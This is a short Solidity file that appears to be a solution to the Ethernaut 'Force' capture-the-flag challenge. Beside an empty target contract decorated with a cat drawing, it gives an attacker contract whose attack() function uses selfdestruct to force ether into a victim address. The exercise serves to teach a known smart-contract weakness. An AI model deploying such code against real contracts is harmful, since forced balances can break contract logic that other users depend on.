//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract SendForce {

    address payable public victim;

    constructor(address _address) payable {
        victim = payable(_address);
    }

    function attack () public {
        selfdestruct(victim);
    }
}
